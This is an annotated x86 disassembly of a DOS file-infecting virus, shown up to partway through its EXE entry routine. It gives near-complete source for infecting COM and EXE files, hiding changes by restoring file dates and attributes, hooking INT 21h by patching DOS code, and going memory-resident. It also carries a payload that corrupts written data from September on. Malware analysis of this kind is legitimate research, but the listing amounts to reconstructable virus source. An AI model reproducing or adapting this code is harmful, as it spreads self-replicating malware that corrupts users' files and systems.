seg_a	segment	byte public
	assume	cs:seg_a, ds:seg_a

	org	100h

start:	mov	ax,es						;0100 8C C0
	add	word ptr cs:[d_010C+2],ax ;segment relocation	;0102 2E: 01 06 010E
	jmp	dword ptr cs:[d_010C]	  ;jump into virus code	;0107 2E: FF 2E 010C

d_010C	dw	0000,0138h		;dword=entry into virus	;010C 0000 0138

				;<- duplicated code (aligning to 20h bytes)
	db	0B8h,008h,000h,08Eh,0C0h,08Bh,00Eh,041h	;0110 B8 08 00 8E C0 8B 0E 41
	db	003h,0BAh,028h,000h,02Eh,08Bh,01Eh,09Bh	;0118 03 BA 28 00 2E 8B 1E 9B

;..............................................................
;	victim code
;..............................................................
	org	1380h


;============================================================================
;	Segment aligned virus segment begin
;----------------------------------------------------------------------------

;================================================================
;	COM virus Entry
;	(this code is present only in case *.COM infection)
;----------------------------------------------------------------
l_0000:	push	ds						;1380 1E
	push	cs						;1381 0E
	pop	ds						;1382 1F
	lea	si,cs:[4F7h]		;d_1877 = saved bytes	;1383 8D 36 04F7
	mov	di,100h						;1387.BF 0100
	mov	cx,20h						;138A B9 0020
	rep	movsb			;restore victim bytes	;138D F3/ A4

	mov	byte ptr cs:[349h],0FFh	;d_16C9	(0FFh = COM)	;138F 2E: C6 06 0349 FF
	nop							;1395 90
	pop	ds						;1396 1F
	lea	ax,cs:[54Fh]		;l_18CF			;1397 8D 06 054F
	jmp	ax						;139B FF E0

				;<--- duplicated fields d_033F - d_0347
	dw	0020						;139D 20 00
	dw	05EAh						;139F EA 05
	dw	0Bh						;13A1 0B 00
	dw	28h						;13A3 28 00
	dw	200h						;13A5 00 02
	db	0						;13A7 00

;===========================================================================
;	Begin of file type independent virus code
;---------------------------------------------------------------------------

;================================================================
;	Get/Set victim attribute
;----------------------------------------------------------------
s_13A8	proc	near
	mov	dx,offset ds:[57Fh]	;file name		;13A8.BA 057F
	mov	ah,43h			;get/set file attrb	;13AB B4 43
	int	21h						;13AD CD 21
	retn							;13AF C3
s_13A8	endp

;================================================================
;	Move file ptr to EOF
;----------------------------------------------------------------
s_13B0	proc	near
	xor	cx,cx						;13B0 33 C9
	xor	dx,dx						;13B2 33 D2
	mov	ax,4202h	;move file ptr EOF+offset	;13B4 B8 4202
	mov	bx,cs:[9Bh]	;l_141B = file handle		;13B7 2E: 8B 1E 009B
	int	21h						;13BC CD 21
	retn							;13BE C3
s_13B0	endp


;================================================================
;	Read 32 bytes into buffer
;----------------------------------------------------------------
s_13BF	proc	near
	mov	cx,20h						;13BF B9 0020
	mov	dx,4F7h			;l_1877-sav victim bytes;13C2.BA 04F7
	mov	bx,cs:[9Bh]		;l_141B = file handle	;13C5 2E: 8B 1E 009B
	mov	ah,3Fh			;read file		;13CA B4 3F
	int	21h						;13CC CD 21
	mov	cx,ax			;bytes read		;13CE 8B C8
	retn							;13D0 C3
s_13BF	endp

;================================================================
;	Write 32 B into file
;----------------------------------------------------------------
s_13D1	proc	near
	mov	ax,8			;switch off destruction	;13D1 B8 0008
	mov	es,ax						;13D4 8E C0
	mov	cx,20h						;13D6 B9 0020
	mov	dx,offset ds:[4F7h]	;l_1877 - saved bytes	;13D9.BA 04F7
	mov	bx,cs:[9Bh]		;l_141B = file handle	;13DC 2E: 8B 1E 009B
	mov	ah,40h			;write file cx=bytes	;13E1 B4 40
	int	21h						;13E3 CD 21
	mov	cx,ax						;13E5 8B C8
	retn							;13E7 C3
s_13D1	endp

;================================================================
;	Calculate virus length
;----------------------------------------------------------------
s_13E8	proc	near
	mov	ax,612h			;virus code length	;13E8 B8 0612
	mov	dx,28h			;file type depended code;13EB BA 0028
	sub	ax,dx						;13EE 2B C2
	mov	ds:[341h],ax		;l_16C1	const vcode len	;13F0 A3 0341
	retn							;13F3 C3
s_13E8	endp

;================================================================
;	Get/Set file daye & time
;----------------------------------------------------------------
s_13F4	proc	near
	mov	bx,ds:[9Bh]		;l_141B = file handle	;13F4 8B 1E 009B
	mov	ah,57h		;get/set file date & time	;13F8 B4 57
	int	21h						;13FA CD 21
	retn							;13FC C3
s_13F4	endp

;================================================================
;	Contamine File - master routine
;----------------------------------------------------------------
s_13FD	proc	near
	mov	byte ptr ds:[349h],0	;d_16C9	(000h = EXE)	;13FD C6 06 0349 00
	nop							;1402 90
	mov	al,0						;1403 B0 00
	call	s_13A8			;Get victim attribute	;1405 E8 FFA0
	jc	l_146A			;-> EXIT		;1408 72 60
	mov	ds:[33Fh],cx		;l_16BF oryg. file attr	;140A 89 0E 033F
	mov	cx,20h						;140E B9 0020
	mov	al,1						;1411 B0 01
	call	s_13A8			;Set victim attribute	;1413 E8 FF92
	jc	l_146A			;-> EXIT		;1416 72 52
	jmp	short l_1421					;1418 EB 07
	nop							;141A 90

d_009B	dw	0005h			;file handle		;141B 05 00
d_009D	dw	0400h						;141D 00 04
d_009F	dw	057Fh			;filepath address	;141F 7F 05

l_1421:	mov	word ptr cs:[9Fh],057Fh	;l_141F	:= offset l_18FF;1421 2E C7 06 9F 00 7F 05
	mov	dx,ds:[9Fh]		;l_141F	- file name	;1428 8B 16 009F
	mov	ax,400h						;142C B8 0400
	mov	ds:[9Dh],ax		;l_141D			;142F A3 009D
	mov	al,2						;1432 B0 02
	mov	ah,3Dh			;open file, al=mode	;1434 B4 3D
	int	21h						;1436 CD 21
	mov	word ptr ds:[9Bh],0FFFFh  ;l_141B = file handle	;1438 C7 06 009B FFFF
	jc	l_1443						;143E 72 03
	mov	ds:[9Bh],ax		;l_141B = file handle	;1440 A3 009B
l_1443:	mov	ax,ds:[9Bh]		;l_141B = file handle	;1443 A1 009B
	cmp	ax,0FFFFh					;1446 3D FFFF
	je	l_146A			;-> EXIT, open file err	;1449 74 1F
	mov	al,0						;144B B0 00
	call	s_13F4			;Get file daye & time	;144D E8 FFA4
	jc	l_148F			;-> err, close & exit	;1450 72 3D
	mov	ds:[0E8h],dx		;l_1468 = date		;1452 89 16 00E8
	mov	ds:[0EDh],cx		;l_146D = time		;1456 89 0E 00ED
	call	s_13BF			;Read 32 B into buffer	;145A E8 FF62
	mov	ax,word ptr ds:[4F7h]	;l_1877 first file word	;145D A1 04F7
	cmp	ax,5A4Dh		;'MZ' ?			;1460 3D 5A4D
	je	l_146F			;-> yes, EXE		;1463 74 0A
	jmp	l_1616			;-> no, COM		;1465 E9 01AE

d_00E8	dw	0EF8h			;victim date		;1468 F8 0E

l_146A:	jmp	l_15C6						;146A E9 0159

d_00ED	dw	0001h			;victim time		;146D 01 00

;================================================================
;	EXE file contamination
;----------------------------------------------------------------
l_146F:	mov	ax,word ptr ds:[509h]	;+12h = negative sum	;146F A1 0509
	neg	ax						;1472 F7 D8
	cmp	ax,word ptr ds:[4F9h]	;+2 = last page bytes	;1474 3B 06 04F9
	je	l_148F			;-> allready infected	;1478 74 15
	mov	ax,word ptr ds:[4FBh]	;+4 = pages in file	;147A A1 04FB
	cmp	ax,3						;147D 3D 0003
	jb	l_148F			;-> file to small	;1480 72 0D
	mov	ax,word ptr ds:[4FFh]	;+8 = size of hdr (para);1482 A1 04FF
	mov	cl,4						;1485 B1 04
	shl	ax,cl						;1487 D3 E0
	mov	ds:[347h],ax		;l_16C7	= size of header;1489 A3 0347
	jmp	short l_1492					;148C EB 04
	nop							;148E 90

l_148F:	jmp	l_15A8						;148F E9 0116

l_1492:	mov	ax,word ptr ds:[50Bh]	;+14h = IP		;1492 A1 050B
	mov	word ptr ds:[5B4h],ax	;l_1934			;1495 A3 05B4
	mov	word ptr ds:[50Bh],28h	;new IP value (l_13A8)	;1498 C7 06 050B 0028
	call	s_13B0			;Move file ptr to EOF	;149E E8 FF0F
	push	ax						;14A1 50
	push	dx						;14A2 52
	sub	ax,ds:[347h]		;l_16C7=size of header	;14A3 2B 06 0347
	sbb	dx,0						;14A7 83 DA 00
	mov	word ptr ds:[439h],ax	;l_17B9			;14AA A3 0439
	mov	word ptr ds:[437h],dx	;l_17B7			;14AD 89 16 0437
	cmp	dx,0						;14B1 83 FA 00
	ja	l_14D3			;-> more then 64KB	;14B4 77 1D
	cmp	ax,word ptr ds:[50Bh]	;+14h = IP		;14B6 3B 06 050B
	ja	l_14D3			;-> more then 28h length;14BA 77 17

					;<- EXE code length =< 28h
	mov	word ptr ds:[345h],0	;l_16C5			;14BC C7 06 0345 0000
	mov	bx,word ptr ds:[50Bh]				;14C2 8B 1E 050B
	sub	bx,ax			;28h - file length	;14C6 2B D8
	mov	ds:[343h],bx		;l_16C3	- aligning bytes;14C8 89 1E 0343
	mov	ds:[513h],bx		;+1Ch = ?		;14CC 89 1E 0513
	jmp	short l_1511					;14D0 EB 3F
	nop							;14D2 90

l_14D3:	sub	ax,word ptr ds:[50Bh]	;+14h = IP=28h		;14D3 2B 06 050B
	sbb	dx,0						;14D7 83 DA 00
	mov	ds:[345h],ax		;d_16C5			;14DA A3 0345
	and	ax,0Fh						;14DD 25 000F
	cmp	ax,0						;14E0 3D 0000
	jne	l_14F9			;-> need aligment	;14E3 75 14

	mov	word ptr ds:[343h],0	;d_16C3	- aligning bytes;14E5 C7 06 0343 0000
	mov	ax,ds:[345h]		;d_16C5			;14EB A1 0345
	mov	cx,10h						;14EE B9 0010
	div	cx						;14F1 F7 F1
	mov	ds:[345h],ax		;d_16C5	- segment of vir;14F3 A3 0345
	jmp	short l_1511					;14F6 EB 19
	db	90h						;14F8 90

				;<---- need alignment
l_14F9:	mov	word ptr ds:[343h],10h	;d_16C3	- aligning bytes;14F9 C7 06 0343 0010
	sub	ds:[343h],ax		;d_16C3	- aligning bytes;14FF 29 06 0343
	mov	ax,ds:[345h]		;d_16C5			;1503 A1 0345
	mov	cx,10h						;1506 B9 0010
	div	cx						;1509 F7 F1
	add	ax,1			;+ alignment paragraph	;150B 05 0001
	mov	ds:[345h],ax		;d_16C5	- segment of vir;150E A3 0345

l_1511:	mov	ax,word ptr ds:[50Dh]	;+ 16h = CS		;1511 A1 050D
	mov	word ptr ds:[5B6h],ax	;d_1936 - victim CS	;1514 A3 05B6
	mov	ax,ds:[345h]		;d_16C5			;1517 A1 0345
	mov	word ptr ds:[50Dh],ax	;+ 16h = CS		;151A A3 050D
	push	ax						;151D 50
	mov	ax,word ptr ds:[505h]	;+ 0Eh = SS		;151E A1 0505
	mov	word ptr ds:[5A1h],ax	;d_1921 - victim SS	;1521 A3 05A1
	pop	ax						;1524 58
	mov	word ptr ds:[505h],ax	;+ 0Eh = virus SS	;1525 A3 0505
	mov	ax,word ptr ds:[507h]	;+ 10h = SP		;1528 A1 0507
	mov	word ptr ds:[5A3h],ax	;d_1923 victim SP	;152B A3 05A3
	lea	ax,cs:[612h]		;End of virus		;152E 8D 06 0612
	add	ax,1Eh			;virus stack		;1532 05 001E
	add	ax,ds:[343h]		;d_16C3	- aligning bytes;1535 03 06 0343
	mov	word ptr ds:[507h],ax	;virus SP		;1539 A3 0507
	call	s_13E8			;Calculate virus length	;153C E8 FEA9
	pop	dx			;<- victim EOF		;153F 5A
	pop	ax						;1540 58
	add	ax,ds:[341h]		;l_16C1	const vcode len	;1541 03 06 0341
	adc	dx,0						;1545 83 D2 00
	add	ax,ds:[343h]		;d_16C3	- aligning bytes;1548 03 06 0343
	adc	dx,0						;154C 83 D2 00
	mov	cx,200h			;page length		;154F B9 0200
	div	cx						;1552 F7 F1
	cmp	dx,0						;1554 83 FA 00
	je	l_155A						;1557 74 01
	inc	ax						;1559 40
l_155A:	mov	word ptr ds:[4FBh],ax	;+4 - file len in pages	;155A A3 04FB
	mov	word ptr ds:[4F9h],dx	;+2 - last page length	;155D 89 16 04F9
	neg	dx						;1561 F7 DA
	mov	word ptr ds:[509h],dx	;+12h = negative sum	;1563 89 16 0509
	mov	cx,54Fh			;offset l_18CF-EXE entry;1567 B9 054F
	mov	word ptr ds:[50Bh],cx	;+14h - virus IP	;156A 89 0E 050B
	cmp	word ptr ds:[343h],3	;d_16C3	- aligning bytes;156E 83 3E 0343 03
	jb	l_1580						;1573 72 0B

					;<- file begins with jump
	mov	cx,28h						;1575 B9 0028
	sub	cx,ds:[343h]		;d_16C3	- aligning bytes;1578 2B 0E 0343
	mov	word ptr ds:[50Bh],cx				;157C 89 0E 050B

l_1580:	call	s_15DF			;Set file pointer to BOF;1580 E8 005C
	call	s_13D1			;Write 32 B into file	;1583 E8 FE4B
	jc	l_15A8			;-> error, EXIT		;1586 72 20
	mov	cx,ds:[343h]		;d_16C3	- aligning bytes;1588 8B 0E 0343
	sub	cx,3			;jmp instruction length	;158C 83 E9 03
	mov	ax,54Fh			;offset l_18CF=EXE entry;158F B8 054F
	mov	bx,28h			;beginning of code	;1592 BB 0028
	sub	ax,bx			;jmp distance		;1595 2B C3
	add	cx,ax			;aligning bytes		;1597 03 C8
	mov	word ptr ds:[54Ch],cx	;l_18CC	= jump distance	;1599 89 0E 054C
	call	s_13B0			;Move file ptr to EOF	;159D E8 FE10
	call	s_15C7			;Align EOF to paragraphs;15A0 E8 0024
	jc	l_15A8			;-> error, EXIT		;15A3 72 03
	call	s_15FE			;Write const part of vir;15A5 E8 0056

;================================================================
;	End of contamination (common to EXE & COM)
;----------------------------------------------------------------
l_15A8:	mov	al,1			;to set			;15A8 B0 01
	mov	dx,ds:ds:[0E8h]		;d_1468	victim date	;15AA 8B 16 00E8
	mov	cx,ds:ds:[0EDh]		;d_146D	victim time	;15AE 8B 0E 00ED
	call	s_13F4			;Set file daye & time	;15B2 E8 FE3F

	mov	bx,ds:[9Bh]		;l_141B = file handle	;15B5 8B 1E 009B
	mov	ah,3Eh			;close file		;15B9 B4 3E
	int	21h						;15BB CD 21

	mov	al,1			;to set			;15BD B0 01
	mov	cx,ds:[33Fh]		;l_16BF oryg. file attr	;15BF 8B 0E 033F
	call	s_13A8			;Set victim attribute	;15C3 E8 FDE2

l_15C6:	retn							;15C6 C3

;================================================================
;	Align end of file to paragraphs
;----------------------------------------------------------------
s_15C7:	mov	ax,8			;to switch off virus	;15C7 B8 0008
	mov	es,ax						;15CA 8E C0
	mov	cx,ds:[343h]		;l_16C3	- aligning bytes;15CC 8B 0E 0343
	mov	dx,54Bh			;offset d_18CB		;15D0.BA 054B
	mov	bx,cs:[9Bh]		;l_141B = file handle	;15D3 2E: 8B 1E 009B
	mov	ah,40h			;write file		;15D8 B4 40
	int	21h						;15DA CD 21
	mov	cx,ax						;15DC 8B C8
	retn							;15DE C3

;================================================================
;	Set file pointer to BOF
;----------------------------------------------------------------
s_15DF:	xor	cx,cx						;15DF 33 C9
	xor	dx,dx						;15E1 33 D2
	mov	ax,4200h	;move file ptr, cx,dx=offset	;15E3 B8 4200
	mov	bx,cs:[9Bh]	;l_141B = file handle		;15E6 2E: 8B 1E 009B
	int	21h						;15EB CD 21
	retn							;15ED C3

;================================================================
;	COM virus start code pattern
;----------------------------------------------------------------
d_026E:	mov	ax,es						;15EE 8C C0
	add	word ptr cs:[010Ch+2],ax			;15F0 2E: 01 06 010E
	jmp	dword ptr cs:[010Ch]				;15F5 2E: FF 2E 010C
d_027A	dw	0						;15FA 00 00
d_027C	dw	0138h						;15FC 38 01

;================================================================
;	Write constant part of virus
;----------------------------------------------------------------
s_15FE:	mov	ax,8			;switch off virus	;15FE B8 0008
	mov	es,ax						;1601 8E C0
	mov	cx,ds:[341h]		;l_16C1	const.code leng.;1603 8B 0E 0341
	mov	dx,28h			;offset l_13A8 - vircode;1607.BA 0028
	mov	bx,cs:[9Bh]		;l_141B = file handle	;160A 2E: 8B 1E 009B
	mov	ah,40h			;write file		;160F B4 40
	int	21h						;1611 CD 21
	mov	cx,ax						;1613 8B C8
	retn							;1615 C3

;================================================================
;	COM victim contamination
;----------------------------------------------------------------
l_1616:	cmp	word ptr ds:[4F9h],12Eh	;BOF+2			;1616 81 3E 04F9 012E
	je	l_15A8			;-> contamined, EXIT	;161C 74 8A
	call	s_13B0			;Move file ptr to EOF	;161E E8 FD8F
	cmp	ax,3E8h			;1000 byte file length	;1621 3D 03E8
	jb	l_169F			;-> bellow, EXIT	;1624 72 79
	add	ax,100h			;add PSP		;1626 05 0100
	adc	dx,0						;1629 83 D2 00
	push	ax						;162C 50
	and	ax,0Fh						;162D 25 000F
	mov	word ptr ds:[343h],0	;l_16C3	aligning bytes	;1630 C7 06 0343 0000
	cmp	ax,0						;1636 3D 0000
	je	l_1645			;-> para aligned file	;1639 74 0A
	mov	word ptr ds:[343h],10h	;l_16C3	- aligning bytes;163B C7 06 0343 0010
	sub	ds:[343h],ax		;l_16C3	- aligning bytes;1641 29 06 0343
l_1645:	pop	ax						;1645 58
	add	ax,ds:[343h]		;l_16C3	aligning bytes	;1646 03 06 0343
	adc	dx,0						;164A 83 D2 00
	cmp	dx,0						;164D 83 FA 00
	ja	l_169F			;-> file to big, EXIT	;1650 77 4D
	mov	cl,4						;1652 B1 04
	shr	ax,cl			;bytes 2 paragraphs	;1654 D3 E8
	cmp	word ptr ds:[343h],0	;l_16C3	- aligning bytes;1656 83 3E 0343 00
	mov	ds:[27Ch],ax		;l_15FC	virus segment	;165B A3 027C
	mov	word ptr ds:[27Ah],0	;l_15FA	virus entry	;165E C7 06 027A 0000
	call	s_15DF			;Set file pointer to BOF;1664 E8 FF78
	mov	ax,8			;to switch off virus	;1667 B8 0008
	mov	es,ax						;166A 8E C0
	mov	cx,20h			;bytes to write		;166C B9 0020
	mov	dx,26Eh			;offset l_15EE		;166F.BA 026E
	mov	bx,cs:[9Bh]		;l_141B = file handle	;1672 2E: 8B 1E 009B
	mov	ah,40h			;write file		;1677 B4 40
	int	21h						;1679 CD 21
	mov	cx,ax			;bytes written		;167B 8B C8
	call	s_13B0			;Move file ptr to EOF	;167D E8 FD30
	call	s_15C7			;write aligning bytes	;1680  E8 FF44

	mov	ax,8			;switch off virus	;1683  B8 0008
	mov	es,ax						;1686  8E C0
	mov	cx,28h			;40 bytes		;1688  B9 0028
	mov	dx,322h			;offset l_16A2		;168B .BA 0322
	mov	bx,cs:[9Bh]		;l_141B = file handle	;168E  2E: 8B 1E 009B
	mov	ah,40h			;write file		;1693  B4 40
	int	21h						;1695  CD 21
	mov	cx,ax			;bytes written		;1697 8B C8
	call	s_13E8			;Calculate virus length	;1699 E8 FD4C
	call	s_15FE			;Write const part of vir;169C  E8 FF5F
l_169F:	jmp	l_15A8			;close files, EXIT	;169F  E9 FF06
s_13FD	endp

				;<-- COM type virus begin pattern
d_0322:	push	ds						;16A2 1E
	push	cs						;16A3 0E
	pop	ds						;16A4 1F
	lea	si,cs:[4F7h]					;16A5 8D 36 04F7
	mov	di,0100h					;16A9.BF 0100
	mov	cx,20h						;16AC B9 0020
	rep	movsb						;16AF F3/ A4
	mov	byte ptr cs:[349h],0FFh	;d_16C9	(0FFh = COM)	;16B1 2E: C6 06 0349 FF
	nop							;16B7 90
	pop	ds						;16B8 1F
	lea	ax,cs:[54Fh]					;16B9 8D 06 054F
	jmp	ax						;16BD FF E0

;------ work area
d_033F	dw	0020h			;oryg. file attr	;16BF 20 00
d_0341	dw	05EAh			;const virus code length;16C1 EA 05
d_0343	dw	0Bh			;aligning bytes		;16C3 0B 00
d_0345	dw	28h						;16C5 28 00
d_0347	dw	200h			;size of header		;16C7 00 02
d_0349	db	0			;0=EXE, 0FFh=COM	;16C9 00

;================================================================
;	init registers
;----------------------------------------------------------------
s_16CA	proc	near
	xor	si,si						;16CA 33 F6
	xor	di,di						;16CC 33 FF
	xor	ax,ax						;16CE 33 C0
	xor	dx,dx						;16D0 33 D2
	xor	bp,bp						;16D2 33 ED
	retn							;16D4 C3
s_16CA	endp

;================================================================
;	int 24h handling routine (infection time active only)
;----------------------------------------------------------------
l_16D5:	cmp	di,0						;16D5 83 FF 00
	jne	l_16DD						;16D8 75 03
	mov	al,3			;ignore			;16DA B0 03
	iret							;16DC CF

l_16DD:	jmp	dword ptr cs:[362h]	;L_16E2 = old int 24h	;16DD 2E: FF 2E 0362

d_0362	dw	0556h,0DF0h					;16E2 56 05 F0 0D

;================================================================
;	Get int 24h
;----------------------------------------------------------------
s_16E6	proc	near
	cli		; Disable interrupts			;16E6 FA
	xor	bx,bx						;16E7 33 DB
	mov	es,bx						;16E9 8E C3
	mov	bx,es:[90h]		;int 24h offset		;16EB 26: 8B 1E 0090
	mov	word ptr cs:[362h],bx	;l_16E2			;16F0 2E: 89 1E 0362
	mov	bx,es:[92h]		;int 24h segment	;16F5 26: 8B 1E 0092
	mov	word ptr cs:[362h+2],bx	;L_16E2+2		;16FA 2E: 89 1E 0364
	mov	word ptr es:[90h],355h	;offset l_16D5		;16FF 26: C7 06 0090 0355
	mov	es:[92h],ax		;int 24h segment := CS	;1706 26: A3 0092
	sti							;170A FB
	retn							;170B C3
s_16E6	endp


;================================================================
;	Restore int 24h vector
;----------------------------------------------------------------
s_170C	proc	near
	cli							;170C FA
	xor	bx,bx						;170D 33 DB
	mov	es,bx						;170F 8E C3
	mov	bx,word ptr cs:[362h]				;1711 2E: 8B 1E 0362
	mov	es:[90h],bx					;1716 26: 89 1E 0090
	mov	bx,word ptr cs:[362h+2]				;171B 2E: 8B 1E 0364
	mov	es:[92h],bx					;1720 26: 89 1E 0092
	sti							;1725 FB
	retn							;1726 C3
s_170C	endp

;===============================================================
;	write handle service routine (destruction routine)
;---------------------------------------------------------------
s_1727	proc	near
	push	ax						;1727 50
	push	bx						;1728 53
	push	cx						;1729 51
	push	dx						;172A 52
	push	es						;172B 06
	push	ds						;172C 1E
	push	si						;172D 56
	push	di						;172E 57
	mov	ax,es						;172F 8C C0
	cmp	ax,8						;1731 3D 0008
	je	l_1750		;-> virus contamination		;1734 74 1A
	cmp	bx,4						;1736 83 FB 04
	jb	l_1750		;-> BIOS			;1739 72 15
	mov	ah,2Ah		;get date, cx=year, dx=mon/day	;173B B4 2A
	int	21h						;173D CD 21
	cmp	dh,9		;september ?			;173F 80 FE 09
	jb	l_1750		;-> bellow			;1742 72 0C
	pop	di						;1744 5F
	pop	si						;1745 5E
	pop	ds						;1746 1F
	pop	es						;1747 07
	pop	dx						;1748 5A
	pop	cx						;1749 59
	pop	bx						;174A 5B
	pop	ax						;174B 58
	add	dx,0Ah		;shift buffer address		;174C 83 C2 0A
	retn							;174F C3

l_1750:	pop	di						;1750 5F
	pop	si						;1751 5E
	pop	ds						;1752 1F
	pop	es						;1753 07
	pop	dx						;1754 5A
	pop	cx						;1755 59
	pop	bx						;1756 5B
	pop	ax						;1757 58
	retn							;1758 C3
s_1727	endp

	db	16 dup (0)		;not used		;1759 0010[00]

;================================================================
;	Load & Execute service routine
;----------------------------------------------------------------
s_1769	proc	near
	push	ax						;1769 50
	push	bx						;176A 53
	push	cx						;176B 51
	push	dx						;176C 52
	push	es						;176D 06
	push	ds						;176E 1E
	push	si						;176F 56
	push	di						;1770 57
	mov	si,dx			;file pathname		;1771 8B F2
	mov	ax,cs						;1773 8C C8
	mov	es,ax						;1775 8E C0
	mov	di,offset ds:[57Fh]	;l_18FF - victim name	;1777.BF 057F
	mov	cx,19h						;177A B9 0019
	rep	movsb			;copy victim name	;177D F3/ A4
	call	s_16E6			;Get int 24h vector	;177F E8 FF64
	mov	ds,ax			;ds:=cs			;1782 8E D8
	call	s_13FD						;1784 E8 FC76
	call	s_170C			;Restore int 24h vector	;1787 E8 FF82
	pop	di						;178A 5F
	pop	si						;178B 5E
	pop	ds						;178C 1F
	pop	es						;178D 07
	pop	dx						;178E 5A
	pop	cx						;178F 59
	pop	bx						;1790 5B
	pop	ax						;1791 58
	retn							;1792 C3
s_1769	endp

;================================================================
;	New int 21h service routine
;----------------------------------------------------------------
				;<---- 10 bytes to identify resident virus
d_0413:	pushf							;1793 9C
	cmp	ah,40h		;write handle ?			;1794 80 FC 40
	jne	l_179F		;-> no				;1797 75 06
	call	s_1727		;write handle service routine	;1799 E8 FF8B
	jmp	short l_17A7					;179C EB 09
	nop							;179E 90

l_179F:	cmp	ah,4Bh		;Load & Execute ?		;179F 80 FC 4B
	jne	l_17A7		;-> no				;17A2 75 03
	call	s_1769		;Load & Execute service routine	;17A4 E8 FFC2
l_17A7:	popf							;17A7 9D

;================================================================
;   Execute substituted code and jump into old int 21h service
;----------------------------------------------------------------
					;<- four bytes from int 21h service
d_0428:	cmp	ah,51h						;17A8 80 FC 51
d_042B:	je	l_17B2						;17AB 74 05
	jmp	dword ptr cs:[547h]				;17AD 2E: FF 2E 0547
l_17B2:	jmp	dword ptr cs:[49Dh]				;17B2 2E: FF 2E 049D

d_0437	dw	0000h,02A0h		;dword = code length	;17B7 00 00 A0 02

;================================================================
;	Make virus resident
;----------------------------------------------------------------
s_17BB	proc	near
	cli				;disable interrupts	;17BB FA
	push	es						;17BC 06
	lea	si,cs:[413h]		;l_1793			;17BD 8D 36 0413
	mov	di,si						;17C1 8B FE
	mov	cx,9800h		;resident virus segment	;17C3 B9 9800
	mov	es,cx						;17C6 8E C1
	mov	cx,0Ah						;17C8 B9 000A
	repe	cmpsb						;17CB F3/ A6
	cmp	cx,0						;17CD 83 F9 00
	pop	es						;17D0 07
	jz	l_181A			;-> allready resident	;17D1 74 47
	mov	bx,es:[84h]		;int 21h - offset	;17D3 26: 8B 1E 0084
	mov	ax,es:[86h]		;int 21h - segment	;17D8 26: A1 0086
	mov	word ptr ds:[549h],ax	;l_18C9			;17DC A3 0549
	mov	word ptr ds:[49Fh],ax	;l_181F			;17DF A3 049F
	mov	di,bx						;17E2 8B FB
	mov	es,ax						;17E4 8E C0
	mov	cx,80h						;17E6 B9 0080
	mov	al,80h						;17E9 B0 80
l_17EB:	repne	scasb			;find byte 80h		;17EB F2/ AE
	cmp	cx,0						;17ED 83 F9 00
	je	l_1870			;-> not found, EXIT	;17F0 74 7E
	cmp	byte ptr es:[di],0FCh				;17F2 26: 80 3D FC
	jne	l_17EB			;-> find another place	;17F6 75 F3

					;<- get four bytes from int 21h service
	mov	al,es:[di+2]					;17F8 26: 8A 45 02
	mov	byte ptr cs:[42Bh],al	;l_17AB			;17FC 2E: A2 042B
	mov	al,es:[di-1]					;1800 26: 8A 45 FF
	mov	byte ptr cs:[428h],al	;l_17A8			;1804 2E: A2 0428
	mov	al,es:[di]					;1808 26: 8A 05
	mov	byte ptr cs:[429h],al	;l_17A8+1		;180B 2E: A2 0429
	mov	al,es:[di+1]					;180F 26: 8A 45 01
	mov	byte ptr cs:[42Ah],al	;l_17A8+2		;1813 2E: A2 042A
	jmp	short l_1821					;1817 EB 08
	nop							;1819 90

					;<- allready resident
l_181A:	jmp	short l_1870		;-> EXIT		;181A EB 54
	nop							;181C 90

d_049D	dw	140Dh			;address to jump1 into	;181D 0D 14
d_049F	dw	0278h			;old int 21h segment	;181F 78 02

l_1821:	mov	ax,di						;1821 8B C7
	add	ax,4			;next to conditional jmp;1823 05 0004
	xor	bx,bx						;1826 33 DB
	mov	bl,es:[di+3]		;jump length		;1828 26: 8A 5D 03
	add	ax,bx			;jump address		;182C 03 C3
	mov	word ptr ds:[49Dh],ax	;l_181D			;182E A3 049D
	cmp	byte ptr es:[di+3],80h				;1831 26: 80 7D 03 80
	jb	l_183E			;-> forward jump	;1836 72 06
					;<- jump backwards
	sub	ax,100h			;minus carry		;1838 2D 0100
	mov	word ptr ds:[49Dh],ax	;l_181D			;183B A3 049D
l_183E:	add	di,4			;second condition addrs	;183E 83 C7 04
	mov	word ptr ds:[547h],di				;1841 89 3E 0547
	sub	di,5			;<- area to substitute	;1845 83 EF 05
	push	es						;1848 06
	push	di						;1849 57
	mov	dx,9800h		;resident virus segment	;184A BA 9800
	mov	word ptr cs:[4F5h],dx				;184D 2E: 89 16 04F5
	mov	es,dx						;1852 8E C2
	xor	si,si						;1854 33 F6
	xor	di,di						;1856 33 FF
	mov	cx,612h			;l_1380 -> l_1992	;1858 B9 0612
	rep	movsb			;copy virus code	;185B F3/ A4

				;<----- take control over int 21h
	lea	cx,cs:[413h]		;offset l_1793		;185D 8D 0E 0413
	mov	word ptr ds:[4F3h],cx				;1861 89 0E 04F3
	pop	di						;1865 5F
	pop	es						;1866 07
	mov	cx,5						;1867 B9 0005
	lea	si,cs:[4F2h]		;offset l_1792		;186A 8D 36 04F2
	rep	movsb						;186E F3/ A4
l_1870:	sti							;1870 FB
	retn							;1871 C3
s_17BB	endp

			;<---- instruction pattern to write over int 21h code
d_04F2	db	0EAh			;JMP FAR 9800:l_1793	;1872 EA
d_04F3	dw	0			;:= offset l_1793	;1873 00 00
d_04F5	dw	9800h			;resident virus segment	;1875 00 98

;================================================
;		saved 32 victim bytes
;------------------------------------------------
d_04F7	db	0E9h,0FFh,11h					;1877 E9 FF 11
	db	'Converted',0,0,0,0				;187A 43 6F 6E 76 65 72
								;1880 74 65 64 00 00 00 00
	db	'MZ'						;1887 4D 5A
	db	0EAh,01h,09h,00h,08h,00h			;1889 EA 01 09 00 08 00
	db	20h,00h,00h,00h,0FFh,0FFh			;188F 20 00 00 00 FF FF
	db	98h,00h						;1895 98 00 00

;-----------------------------------
	db	48 dup (0)		;not used		;1897 0030[00]

d_0547	dw	146Ch			;address to jump2 into	;18C7 6C 14
d_0549	dw	0278h			;old int 21h segment	;18C9 78 02

			;<------ code writed to in case of paragraf alignement
	db	0E9h			;jmp l_18CF		;18CB E9
d_054C	dw	052Ch			;distance of jump	;18CC 2C 05
	db	0						;18CE 00

;================================================================
;	EXE virus entry
;----------------------------------------------------------------
l_18CF:	push	bx						;18CF 53
	push	cx						;18D0 51
	push	es						;18D1 06
	push	ds						;18D2 1E
	pushf							;18D3 9C
	mov	ax,cs						;18D4 8C C8
	mov	ds,ax						;18D6 8E D8
	call	s_1938			;make virus resident	;18D8 E8 005D
	cmp	byte ptr ds:[349h],0FFh	;l_16C9	(0FFh=COM)	;18DB 80 3E 0349 FF
	je	l_18E5						;18E0 74 03
